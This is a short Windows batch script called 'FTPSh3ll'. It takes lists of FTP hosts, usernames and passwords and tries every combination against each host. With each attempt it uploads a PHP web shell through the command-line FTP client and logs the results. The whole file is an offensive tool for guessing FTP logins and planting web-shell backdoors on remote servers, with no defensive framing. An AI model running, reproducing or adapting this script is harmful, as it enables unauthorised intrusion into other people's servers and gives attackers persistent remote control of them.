@ECHO OFF
COLOR 0A
TITLE FTPSh3ll - Inactive
ECHO ############################
ECHO #         FTPSh3ll         #
ECHO #www.github.com/equin0x/gen#
ECHO ############################
IF "%1"=="" goto Invalid
IF "%2"=="" goto Invalid
IF "%3"=="" goto Invalid
GoTo Valid
:Invalid
ECHO Usage: ftpsh3ll ftplist.txt userlist.txt passlist.txt shell.php
GoTo EOF

:Valid
FOR /F %%A in (%1) do (
	FOR /F %%B in (%2) do (
		FOR /F %%C in (%3) do (
			TITLE FTPSh3ll - Uploading shell to %%A
			ECHO USER %%B > %TEMP%\FTP.TXT
			ECHO %%C >> %TEMP%\FTP.TXT
			ECHO BIN >> %TEMP%\FTP.TXT
			ECHO PUT "%4" >> %TEMP%\FTP.TXT
			ECHO QUIT >> %TEMP%\FTP.TXT
			FTP -n -s:%TEMP%\FTP.TXT %%A >> Log.txt
		)
	)
)
:EOF